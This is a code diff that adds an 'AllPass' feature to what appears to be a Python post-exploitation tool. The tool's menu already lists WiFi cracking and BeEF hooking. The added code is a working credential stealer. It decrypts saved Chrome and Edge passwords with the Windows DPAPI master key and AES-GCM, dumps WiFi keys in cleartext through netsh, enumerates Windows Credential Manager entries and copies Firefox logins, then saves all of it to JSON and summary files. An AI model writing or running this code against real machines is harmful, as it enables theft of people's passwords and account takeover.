@@ -164,6 +164,9 @@ while True:
 			"WifiCrack - Attempt to crack WiFi passwords",
 			"Hook - Attempt to hook this machine via BeEF"
 		],
+		"Detectible Operations": [
+			"AllPass - Export all found saved passwords",
+		],
 		"Support & Exit": [
 			"info - Show details of a command",
 			"help - Show available actions",
@@ -288,6 +291,10 @@ while True:
 		print("")
 		sleep(0.1)
 		print("WifiCrack) Attempt to crack WiFi passwords: tries to retrieve and crack saved WiFi passwords on the target machine")
+		sleep(0.1)
+		print("")
+		sleep(0.1)
+		print("AllPass) Export all found saved passwords from multiple browsers: retrieves and decrypts saved passwords from various browsers")
 		sleep(0.1)
 		print("")
 		sleep(0.1)
@@ -1256,6 +1263,387 @@ while True:
 		input("\nPress Enter to continue...")
 		cls()
 
+
+	elif action == "AllPass" or action == "allpass":
+		logging.info(f"Chosen action AllPass to extract ALL passwords")
+		print(Fore.YELLOW + "[*] Starting COMPLETE password extraction...")
+		print(Fore.CYAN + "[*] This may take a minute...")
+		
+		all_results = {
+			"timestamp": datetime.now().isoformat(),
+			"machine": platform.node(),
+			"user": os.environ.get('USERNAME', 'Unknown'),
+			"extractions": {}
+		}
+		
+		# 1. CHROME PASSWORDS
+		print(Fore.CYAN + "\n[1] Extracting Chrome passwords...")
+		chrome_passwords = []
+		try:
+			from Crypto.Cipher import AES # type:ignore
+			import win32crypt # type:ignore
+			
+			# Get Chrome master key
+			local_state_path = os.path.join(
+				os.environ['USERPROFILE'],
+				'AppData', 'Local', 'Google', 'Chrome',
+				'User Data', 'Local State'
+			)
+			
+			if os.path.exists(local_state_path):
+				with open(local_state_path, 'r', encoding='utf-8') as f:
+					local_state = json.loads(f.read())
+				
+				encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
+				encrypted_key = encrypted_key[5:]
+				master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+				
+				# Chrome databases
+				chrome_paths = [
+					os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
+					os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Profile 1', 'Login Data'),
+					os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Profile 2', 'Login Data'),
+				]
+				
+				for chrome_db in chrome_paths:
+					if os.path.exists(chrome_db):
+						temp_db = "temp_chrome.db"
+						try:
+							shutil.copy2(chrome_db, temp_db)
+							
+							conn = sqlite3.connect(temp_db)
+							cursor = conn.cursor()
+							cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
+							
+							for url, username, encrypted_password in cursor.fetchall():
+								if not encrypted_password:
+									continue
+								
+								try:
+									if encrypted_password[:3] == b'v10':
+										nonce = encrypted_password[3:15]
+										ciphertext = encrypted_password[15:-16]
+										tag = encrypted_password[-16:]
+										
+										cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+										decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+										password = decrypted.decode('utf-8')
+										
+										chrome_passwords.append({
+											"url": url,
+											"username": username,
+											"password": password
+										})
+								except:
+									continue
+							
+							conn.close()
+							os.remove(temp_db)
+						except:
+							pass
+				
+				print(Fore.GREEN + f"[+] Found {len(chrome_passwords)} Chrome passwords")
+				all_results["extractions"]["chrome"] = {
+					"count": len(chrome_passwords),
+					"passwords": chrome_passwords[:50]  # First 50
+				}
+				
+				# Show sample
+				if chrome_passwords:
+					print(Fore.WHITE + "  Sample:")
+					for i, pwd in enumerate(chrome_passwords[:3]):
+						print(Fore.CYAN + f"    {i+1}. {pwd['url'][:40]}...")
+						print(Fore.WHITE + f"       User: {pwd['username'][:20]}")
+						print(Fore.GREEN + f"       Pass: {pwd['password'][:20]}")
+			else:
+				print(Fore.YELLOW + "[!] Chrome not found")
+		except Exception as e:
+			print(Fore.RED + f"[!] Chrome error: {e}")
+		
+		# 2. MICROSOFT EDGE PASSWORDS
+		print(Fore.CYAN + "\n[2] Extracting Microsoft Edge passwords...")
+		edge_passwords = []
+		try:
+			edge_db_path = os.path.join(
+				os.environ['USERPROFILE'],
+				'AppData', 'Local', 'Microsoft', 'Edge',
+				'User Data', 'Default', 'Login Data'
+			)
+			
+			if os.path.exists(edge_db_path) and 'master_key' in locals():
+				temp_db = "temp_edge.db"
+				try:
+					shutil.copy2(edge_db_path, temp_db)
+					
+					conn = sqlite3.connect(temp_db)
+					cursor = conn.cursor()
+					cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
+					
+					for url, username, encrypted_password in cursor.fetchall():
+						if not encrypted_password:
+							continue
+						
+						try:
+							if encrypted_password[:3] == b'v10':
+								nonce = encrypted_password[3:15]
+								ciphertext = encrypted_password[15:-16]
+								tag = encrypted_password[-16:]
+								
+								cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+								decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+								password = decrypted.decode('utf-8')
+								
+								edge_passwords.append({
+									"url": url,
+									"username": username,
+									"password": password
+								})
+						except:
+							continue
+					
+					conn.close()
+					os.remove(temp_db)
+					
+					print(Fore.GREEN + f"[+] Found {len(edge_passwords)} Edge passwords")
+					all_results["extractions"]["edge"] = {
+						"count": len(edge_passwords),
+						"passwords": edge_passwords[:50]
+					}
+				except:
+					print(Fore.YELLOW + "[!] Could not access Edge database")
+			else:
+				print(Fore.YELLOW + "[!] Edge not found")
+		except Exception as e:
+			print(Fore.RED + f"[!] Edge error: {e}")
+		
+		# 3. WIFI PASSWORDS
+		print(Fore.CYAN + "\n[3] Extracting WiFi passwords...")
+		wifi_passwords = []
+		try:
+			netsh_path = r"C:\Windows\System32\netsh.exe"
+			temp_dir = "temp_wifi"
+			os.makedirs(temp_dir, exist_ok=True)
+			
+			result = subprocess.run(
+				[netsh_path, "wlan", "export", "profile", "key=clear", f"folder={temp_dir}"],
+				capture_output=True,
+				text=True
+			)
+			
+			if "successfully" in result.stdout.lower():
+				import glob
+				for xml_file in glob.glob(os.path.join(temp_dir, "*.xml")):
+					try:
+						with open(xml_file, 'r', encoding='utf-8') as f:
+							content = f.read()
+							
+							import re
+							ssid_match = re.search(r'<name>([^<]+)</name>', content)
+							key_match = re.search(r'<keyMaterial>([^<]+)</keyMaterial>', content)
+							
+							if ssid_match and key_match:
+								wifi_passwords.append({
+									"ssid": ssid_match.group(1),
+									"password": key_match.group(1)
+								})
+					except:
+						continue
+				
+				shutil.rmtree(temp_dir, ignore_errors=True)
+				
+				print(Fore.GREEN + f"[+] Found {len(wifi_passwords)} WiFi passwords")
+				all_results["extractions"]["wifi"] = {
+					"count": len(wifi_passwords),
+					"passwords": wifi_passwords
+				}
+				
+				# Show sample
+				if wifi_passwords:
+					print(Fore.WHITE + "  Sample:")
+					for i, wifi in enumerate(wifi_passwords[:5]):
+						print(Fore.CYAN + f"    {i+1}. {wifi['ssid']}")
+						print(Fore.GREEN + f"       Pass: {wifi['password']}")
+			else:
+				print(Fore.YELLOW + "[!] Could not export WiFi profiles")
+		except Exception as e:
+			print(Fore.RED + f"[!] WiFi error: {e}")
+		
+		# 4. WINDOWS CREDENTIAL MANAGER (Metadata only)
+		print(Fore.CYAN + "\n[4] Checking Windows Credential Manager...")
+		try:
+			cmdkey_path = r"C:\Windows\System32\cmdkey.exe"
+			result = subprocess.run([cmdkey_path, "/list"], capture_output=True, text=True)
+			
+			if result.stdout:
+				credentials = []
+				lines = result.stdout.strip().split('\n')
+				current_entry = {}
+				
+				for line in lines:
+					line = line.strip()
+					if line.startswith('Target:'):
+						if current_entry:
+							credentials.append(current_entry)
+						current_entry = {'Target': line.replace('Target:', '').strip()}
+					elif line.startswith('Type:'):
+						current_entry['Type'] = line.replace('Type:', '').strip()
+					elif line.startswith('User:'):
+						current_entry['User'] = line.replace('User:', '').strip()
+				
+				if current_entry:
+					credentials.append(current_entry)
+				
+				print(Fore.GREEN + f"[+] Found {len(credentials)} stored credentials")
+				all_results["extractions"]["windows_credentials"] = {
+					"count": len(credentials),
+					"credentials": credentials
+				}
+				
+				# Show sample
+				if credentials:
+					print(Fore.WHITE + "  Sample:")
+					for i, cred in enumerate(credentials[:3]):
+						print(Fore.CYAN + f"    {i+1}. {cred.get('Target', 'N/A')}")
+						if 'User' in cred:
+							print(Fore.WHITE + f"       User: {cred['User']}")
+			else:
+				print(Fore.YELLOW + "[!] No stored Windows credentials")
+		except Exception as e:
+			print(Fore.RED + f"[!] Credential error: {e}")
+		
+		# 5. FIREFOX (if exists - shows encrypted data)
+		print(Fore.CYAN + "\n[5] Checking Firefox...")
+		try:
+			import glob
+			firefox_path = os.path.join(
+				os.environ['APPDATA'],
+				'Mozilla', 'Firefox', 'Profiles'
+			)
+			
+			if os.path.exists(firefox_path):
+				profiles = glob.glob(os.path.join(firefox_path, '*.default*'))
+				
+				if profiles:
+					profile = profiles[0]
+					signons_path = os.path.join(profile, 'logins.json')
+					
+					if os.path.exists(signons_path):
+						with open(signons_path, 'r', encoding='utf-8') as f:
+							data = json.load(f)
+						
+						firefox_logins = data.get('logins', [])
+						print(Fore.YELLOW + f"[*] Found {len(firefox_logins)} Firefox logins (encrypted)")
+						print(Fore.YELLOW + "[*] Firefox requires master password for decryption")
+						
+						all_results["extractions"]["firefox"] = {
+							"count": len(firefox_logins),
+							"note": "Encrypted - requires master password",
+							"logins": firefox_logins[:10]
+						}
+					else:
+						print(Fore.YELLOW + "[!] Firefox logins.json not found")
+				else:
+					print(Fore.YELLOW + "[!] No Firefox profiles found")
+			else:
+				print(Fore.YELLOW + "[!] Firefox not installed")
+		except Exception as e:
+			print(Fore.RED + f"[!] Firefox error: {e}")
+		
+		# 6. OPERA/OTHER BROWSERS
+		print(Fore.CYAN + "\n[6] Checking other browsers...")
+		try:
+			# Opera
+			opera_paths = [
+				os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable', 'Login Data'),
+				os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera GX Stable', 'Login Data'),
+			]
+			
+			opera_count = 0
+			for opera_db in opera_paths:
+				if os.path.exists(opera_db):
+					opera_count += 1
+			
+			if opera_count > 0:
+				print(Fore.YELLOW + f"[*] Found Opera database(s) - similar to Chrome")
+				all_results["extractions"]["opera"] = {
+					"found": True,
+					"note": "Similar to Chrome encryption"
+				}
+			else:
+				print(Fore.YELLOW + "[!] No other browsers detected")
+		except Exception as e:
+			print(Fore.RED + f"[!] Other browsers error: {e}")
+		
+		# SAVE EVERYTHING
+		print(Fore.CYAN + "\n" + "="*60)
+		print(Fore.YELLOW + "[*] SAVING ALL EXTRACTED DATA...")
+		
+		# Create summary
+		total_passwords = 0
+		for category, data in all_results["extractions"].items():
+			if "count" in data:
+				total_passwords += data["count"]
+		
+		all_results["summary"] = {
+			"total_extracted_items": total_passwords,
+			"categories_found": list(all_results["extractions"].keys()),
+			"successful_decryption": len(chrome_passwords) + len(edge_passwords) + len(wifi_passwords)
+		}
+		
+		# Save JSON
+		json_file = f"ALL_PASSWORDS_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+		with open(json_file, 'w', encoding='utf-8') as f:
+			json.dump(all_results, f, indent=4, ensure_ascii=False)
+		
+		# Save readable summary
+		summary_file = f"PASSWORD_SUMMARY_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+		with open(summary_file, 'w', encoding='utf-8') as f:
+			f.write("="*70 + "\n")
+			f.write("COMPLETE PASSWORD EXTRACTION REPORT\n")
+			f.write("="*70 + "\n\n")
+			f.write(f"Machine: {platform.node()}\n")
+			f.write(f"User: {os.environ.get('USERNAME', 'Unknown')}\n")
+			f.write(f"Date: {datetime.now()}\n")
+			f.write(f"Total extracted items: {total_passwords}\n\n")
+			
+			f.write("EXTRACTION RESULTS:\n")
+			f.write("-"*70 + "\n")
+			
+			for category, data in all_results["extractions"].items():
+				f.write(f"\n{category.upper()}:\n")
+				if "count" in data:
+					f.write(f"  Found: {data['count']}\n")
+				if "passwords" in data and data["passwords"]:
+					f.write("  Sample passwords:\n")
+					for i, pwd in enumerate(data["passwords"][:3]):
+						if category == "wifi":
+							f.write(f"    {i+1}. SSID: {pwd.get('ssid', 'N/A')}\n")
+							f.write(f"       Password: {pwd.get('password', 'N/A')}\n")
+						elif category in ["chrome", "edge"]:
+							f.write(f"    {i+1}. URL: {pwd.get('url', 'N/A')[:50]}...\n")
+							f.write(f"       User: {pwd.get('username', 'N/A')[:30]}...\n")
+							f.write(f"       Password: {pwd.get('password', 'N/A')[:20]}...\n")
+				f.write("\n")
+			
+			f.write("\n" + "="*70 + "\n")
+			f.write("END OF REPORT\n")
+			f.write("="*70 + "\n")
+		
+		# FINAL OUTPUT
+		print(Fore.GREEN + f"[+] Extraction complete!")
+		print(Fore.GREEN + f"[+] Total items found: {total_passwords}")
+		print(Fore.GREEN + f"[+] JSON file: {json_file}")
+		print(Fore.GREEN + f"[+] Summary file: {summary_file}")
+		print(Fore.CYAN + "\n[*] Categories extracted:")
+		
+		for category in all_results["extractions"].keys():
+			count = all_results["extractions"][category].get("count", "N/A")
+			print(Fore.WHITE + f"  • {category}: {count}")
+		
+		
+		input(Fore.CYAN + "\nPress Enter to continue...")
+		cls()
+
 #Action exit = exiting the program
 	elif action == "exit":
 		logging.info(f"Chosen action PassExport to exit the program")
@@ -1398,6 +1786,14 @@ while True:
 
 	elif action == "info NetScan" or action == "info netscan":
 		print("NetScan) Extract network passwords: retrieves stored network credentials from Windows Credential Manager and mapped network drives, saves results to a text file") 
+		sleep(0.1) 
+		print("")
+		sleep(0.1)
+		input("Press Enter to continue...")
+		cls()
+
+	elif action == "info AllPass" or action == "info allpass":
+		print("AllPass) Extract ALL passwords: performs a comprehensive extraction of saved passwords from multiple sources including Chrome, Edge, WiFi, Windows Credential Manager, and Firefox (encrypted), saves results to a JSON file and a summary text file") 
 		sleep(0.1) 
 		print("")
 		sleep(0.1)
